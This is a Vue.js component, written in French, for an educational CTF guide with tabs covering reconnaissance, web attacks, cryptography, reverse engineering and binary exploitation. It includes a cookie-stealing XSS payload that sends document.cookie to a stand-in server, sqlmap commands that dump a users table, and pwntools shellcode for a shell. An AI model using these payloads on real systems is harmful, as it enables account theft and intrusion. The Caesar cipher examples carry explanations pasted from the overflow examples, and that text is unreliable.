<!--
================================================================================
 Fichier : CTFGuide.vue
 Description :
  Ce composant Vue.js fournit un guide interactif pour les techniques utilisées
  dans les compétitions Capture The Flag (CTF). Il couvre plusieurs catégories
  d'attaques et d'analyses, avec des exemples pratiques de commandes et scripts.

 Fonctionnalités principales :
  - Interface utilisateur basée sur Vuetify avec des onglets pour chaque catégorie :
    - Reconnaissance
    - Web Exploitation
    - Cryptographie
    - Reverse Engineering
    - Pwn (Exploitation de binaires)
  - Explication détaillée des techniques avec des outils recommandés.
  - Affichage des commandes et scripts avec un composant `CodeExample` :
    - Présentation des commandes accompagnées d'explications.
    - Mise en évidence syntaxique des langages utilisés.
  - Navigation fluide avec `v-tabs` et `v-window` pour un accès rapide aux sections.
  - Mise en page adaptée pour une lecture claire et concise.

 Technologies utilisées :
  - Vue.js 3 (Composition API)
  - Vuetify (composants UI)
  - Computed Properties pour afficher dynamiquement les informations.
  - Composant `CodeExample` pour afficher et expliquer les commandes.

 Remarque :
  Ce guide est destiné à des fins éducatives et pour les compétitions CTF. Il
  ne doit être utilisé que dans un cadre légal et éthique.

 Auteur : Psyko
 Date : 24.02.2025
================================================================================
-->

<template>
  <v-container fluid class="pa-0">
    <v-card class="ma-2">
      <v-card-title class="text-h4 text-center red--text">
        Guide des Techniques CTF
      </v-card-title>

      <v-tabs
        v-model="currentTab"
        color="red"
        align-tabs="center"
        grow
      >
        <v-tab value="recon">
          <v-icon start>mdi-magnify</v-icon>
          Reconnaissance
        </v-tab>
        <v-tab value="web">
          <v-icon start>mdi-web</v-icon>
          Web
        </v-tab>
        <v-tab value="crypto">
          <v-icon start>mdi-lock</v-icon>
          Crypto
        </v-tab>
        <v-tab value="reverse">
          <v-icon start>mdi-cog</v-icon>
          Reverse
        </v-tab>
        <v-tab value="pwn">
          <v-icon start>mdi-bug</v-icon>
          Pwn
        </v-tab>
      </v-tabs>

      <v-window v-model="currentTab">
        <!-- Reconnaissance -->
        <v-window-item value="recon">
          <v-card flat>
            <v-card-text>
              <v-list>
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Énumération des ports
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Outils :</span><br>
                        • nmap : Le plus complet<br>
                        • masscan : Pour les scans rapides<br>
                        • rustscan : Ultra rapide, écrit en Rust<br>
                        • netcat : Simple mais efficace
                      </div>

                      <CodeExample
                        title="Scan de base avec Nmap"
                        description="Détection des versions de services"
                        code="nmap -sV 192.168.1.1"
                        explanation="-sV : Détecte les versions des services en cours d'exécution.<br>192.168.1.1 : Adresse IP de la cible."
                      />

                      <CodeExample
                        title="Scan de ports spécifiques"
                        code="nmap -p 22,80,443 192.168.1.1"
                        explanation="-p 22,80,443 : Scan uniquement les ports 22 (SSH), 80 (HTTP) et 443 (HTTPS)."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Énumération Web
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Outils :</span><br>
                        • gobuster : Énumération de répertoires et sous-domaines<br>
                        • ffuf : Fuzzing web moderne et rapide<br>
                        • nikto : Scanner de vulnérabilités web<br>
                        • sublist3r : Énumération de sous-domaines
                      </div>

                      <CodeExample
                        title="Recherche de répertoires avec Gobuster"
                        code="gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
                        explanation="dir : Mode de recherche de répertoires.<br>-u http://192.168.1.1 : URL de la cible.<br>-w : Spécifie le fichier de wordlist à utiliser."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>

        <!-- Web -->
        <v-window-item value="web">
          <v-card flat>
            <v-card-text>
              <v-list>
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Injection SQL
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Outils :</span><br>
                        • SQLmap : Automatisation d'injections SQL<br>
                        • Burp Suite : Interception et modification de requêtes<br>
                        • DBeaver : Client SQL pour l'exploitation
                      </div>

                      <CodeExample
                        title="Détection d'injection SQL avec SQLmap"
                        code="sqlmap -u &quot;http://192.168.1.1/page?id=1&quot; --dbs"
                        explanation="-u : URL vulnérable.<br>--dbs : Liste les bases de données disponibles."
                      />

                      <CodeExample
                        title="Extraction de données"
                        code="sqlmap -u &quot;http://192.168.1.1/page?id=1&quot; -D ma_base_de_donnees -T utilisateurs --dump"
                        explanation="-D : Spécifie la base de données.<br>-T : Spécifie la table.<br>--dump : Extrait les données de la table."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      XSS (Cross-Site Scripting)
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Types :</span><br>
                        • Reflected XSS : Injection via URL<br>
                        • Stored XSS : Persistant dans la base de données<br>
                        • DOM XSS : Manipulation du DOM côté client
                      </div>

                      <CodeExample
                        title="Payload XSS basique"
                        language="html"
                        code="<script>alert('XSS')</script>"
                        explanation="Ce payload affiche une alerte JavaScript si le site est vulnérable."
                      />

                      <CodeExample
                        title="Vol de cookie"
                        language="html"
                        code="<script>fetch('http://mon-serveur/?cookie=' + document.cookie)</script>"
                        explanation="Ce payload envoie les cookies de l'utilisateur à un serveur contrôlé par l'attaquant."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>

        <!-- Crypto -->
        <v-window-item value="crypto">
          <v-card flat>
            <v-card-text>
              <v-list>
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Encodage Base64
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Encodage"
                        code="echo &quot;Hello, World!&quot; | base64"
                        explanation="Résultat : SGVsbG8sIFdvcmxkIQo="
                      />

                      <CodeExample
                        title="Décodage"
                        code="echo &quot;SGVsbG8sIFdvcmxkIQo=&quot; | base64 --decode"
                        explanation="Résultat : Hello, World!"
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Chiffrement César
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Chiffrement (décalage de 3)"
                        language="python"
                        code="texte = &quot;ATTACKATDAWN&quot;
decalage = 3
resultat = &quot;&quot;.join([chr((ord(c) - 65 + decalage) % 26 + 65) for c in texte])
print(resultat)  # DWWDFNDWGDZQ"
                        explanation="b&quot;A&quot; * 100 : Remplit le buffer avec 100 caractères &quot;A&quot;.<br>p32(0xdeadbeef) : Ajoute une adresse de retour (en little-endian)."
                      />

                      <CodeExample
                        title="Déchiffrement"
                        language="python"
                        code="texte = &quot;DWWDFNDWGDZQ&quot;
decalage = 3
resultat = &quot;&quot;.join([chr((ord(c) - 65 - decalage) % 26 + 65) for c in texte])
print(resultat)  # ATTACKATDAWN"
                        explanation="shellcraft.sh() : Génère un shellcode pour un shell interactif.<br>asm() : Assemble le shellcode en code machine."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>

        <!-- Reverse -->
        <v-window-item value="reverse">
          <v-card flat>
            <v-card-text>
              <v-list>
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Analyse Statique
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Recherche de chaînes avec strings"
                        code="strings binary | grep -i &quot;password&quot;"
                        explanation="strings : Extrait les chaînes de caractères lisibles d'un binaire.<br>grep -i &quot;password&quot; : Filtre les résultats pour trouver des mots-clés comme &quot;password&quot;."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Analyse Dynamique
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Débogage avec GDB"
                        code="gdb ./binary
(gdb) break main
(gdb) run
(gdb) info registers"
                        explanation="break main : Place un point d'arrêt à la fonction main.<br>run : Exécute le programme.<br>info registers : Affiche les valeurs des registres."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>

        <!-- Pwn -->
        <v-window-item value="pwn">
          <v-card flat>
            <v-card-text>
              <v-list>
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Buffer Overflow
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Création d'un payload avec Pwntools"
                        language="python"
                        code="from pwn import *

payload = b&quot;A&quot; * 100  # Remplir le buffer
payload += p32(0xdeadbeef)  # Adresse de retour

print(payload)"
                        explanation="b&quot;A&quot; * 100 : Remplit le buffer avec 100 caractères &quot;A&quot;.<br>p32(0xdeadbeef) : Ajoute une adresse de retour (en little-endian)."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Shellcoding
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Génération de shellcode avec Pwntools"
                        language="python"
                        code="from pwn import *

shellcode = asm(shellcraft.sh())
print(shellcode)"
                        explanation="shellcraft.sh() : Génère un shellcode pour un shell interactif.<br>asm() : Assemble le shellcode en code machine."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>
      </v-window>
    </v-card>
  </v-container>
</template>

<script setup>
import { ref } from 'vue'
import CodeExample from '@/components/CodeExample.vue'

const currentTab = ref('recon')
</script>

<style scoped>
.v-list-item-subtitle {
  white-space: pre-line !important;
  display: block !important;
  color: rgba(255, 255, 255, 0.7) !important;
  margin-top: 8px !important;
  padding: 8px !important;
  font-size: 14px !important;
}

.v-list-item-content {
  display: block !important;
  width: 100% !important;
}

.v-list-item {
  display: block !important;
  padding: 16px !important;
  margin-bottom: 8px !important;
  background-color: rgba(0, 0, 0, 0.2) !important;
  border-radius: 4px !important;
}

.v-tab {
  text-transform: none !important;
}

code {
  background-color: rgba(0, 0, 0, 0.3);
  padding: 2px 6px;
  border-radius: 4px;
  font-family: monospace;
  color: #ff5252;
}

.font-weight-bold {
  font-weight: bold !important;
  color: white !important;
  margin-bottom: 4px !important;
  display: inline-block !important;
}

.mt-2 {
  margin-top: 12px !important;
}

.v-divider {
  margin: 16px 0 !important;
  opacity: 0.2 !important;
}

.text-h6 {
  color: white !important;
  font-size: 1.25rem !important;
  font-weight: 500 !important;
  margin-bottom: 8px !important;
}
</style>
